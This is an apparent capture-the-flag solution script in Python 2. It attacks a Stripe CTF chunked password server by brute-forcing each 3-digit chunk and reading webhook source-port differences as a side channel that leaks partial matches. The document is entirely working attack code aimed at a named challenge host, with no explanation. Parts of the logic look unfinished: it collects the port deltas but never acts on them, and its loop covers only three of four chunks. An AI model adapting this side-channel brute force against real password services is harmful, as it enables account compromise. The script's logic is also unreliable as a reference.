#import httplib
import urllib2
import json
import random
import socket
import threading
import Queue

ENV = 'prod'

if ENV is 'prod':
    WEBHOOK_HOST = 'level02-4.stripe-ctf.com%s'
    WEBHOOK_BIND = '10.0.1.136'
    PASSWORDDB_ADDR = 'https://level08-4.stripe-ctf.com/user-vmslkogiiz/'
else:
    WEBHOOK_HOST = 'localhost%s'
    WEBHOOK_BIND = 'localhost'
    PASSWORDDB_ADDR = 'http://localhost:9091'

THREAD_COUNT = 4

EXPECTED_PORT_OFFSET = 4

LOGGING_ENABLED = False
LOGFILE = 'log.txt'

sock_q = Queue.Queue()
port_q = Queue.Queue()
log_q = Queue.Queue()
success_q = Queue.Queue()

chunks = ['000', '000', '000', '000']

def zero_pad_string(strnum):
    while len(strnum) < 3:
        strnum = "0%s" % strnum
    return strnum

def logging(f):
    while True:
        try:
            f.write(repr(log_q.get()) + '\n')
        except:
            """ lol """

if LOGGING_ENABLED:
    f = open(LOGFILE, 'w')
    logthread = threading.Thread(target=logging, args=(f,))
    logthread.start()


def get_password(override_index=None, override_chunk=None):
    if override_index is not None:
        chunks[override_index] = override_chunk
    return "".join(map(str, chunks))


def bind_sockets(num):
    for sockcount in range(0, num):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        breakout = False
        while not breakout:
            try:
                webhook_port = random.randrange(1025, 65534)
                s.bind((WEBHOOK_BIND, webhook_port))
                #print "bound to %s" % webhook_port
                breakout = True
            except Exception, e:
                #print e
                #print "webhook bind to %s failed. retrying." % webhook_port
                """ lol """ 
        sock_q.put(s)
        s = None

def start_listener(sock, thread_id):
    #log_q.put(sock)
    #log_q.put('listening on port %s' % sock.getsockname()[1])
    client, address = sock.accept()
    port_q.put({'thread_id': thread_id, 'port': address[1]})
    if "true" in client.recv(1024):
        print "SWEET JESUS WE WIN. PASSWORD FOUND!"
        success_q.put(thread_id)
    client.close()
    exit()

def do_requests(num, password):
    bind_sockets(num)
    threads = []
    for thread_id in range(0, num):
        sock = sock_q.get(True)
        sock.listen(5)
        #print "starting listener on :%s" % sock.getsockname()[1]
        t = threading.Thread(target=start_listener, args=(sock, thread_id))
        t.start()
        hookurl = "%s" % WEBHOOK_HOST
        hookurl = hookurl % (":" + str(sock.getsockname()[1]))
        payload = json.dumps({"password": password, "webhooks": [hookurl]})
        threads.append({
            'thread_id': thread_id, 
            'listen_port': sock.getsockname()[1], 
            'request_payload': payload,
            'thread': t
        })

    for th in threads:
        r = urllib2.urlopen(PASSWORDDB_ADDR, th['request_payload'])

    #make sure all listeners have finished
    for th2 in threads:
        #print "thread " + str(th2['thread_id']) + " is alive: " + str(th2['thread'].is_alive())
        while th2['thread'].is_alive():
            #print "joining thread " + str(th2['thread_id'])
            th2['thread'].join(1)
    #print threads


def collect_responses():
    responses = {}
    while not port_q.empty():
        r = port_q.get()
        responses[r['thread_id']] = r['port']
    return responses


for chunk in range(0, 3):
    for x in range(0, 999):
        password = get_password(chunk, zero_pad_string(str(x)))
        print password

        do_requests(THREAD_COUNT, password)
        if not success_q.empty():
            print "FLAG: %s" % password
        responses = {}
        responses = collect_responses()
        print responses
        diffsum = 0
        for i in range(0, (THREAD_COUNT - 1)):
            print responses[i] - responses[i + 1]
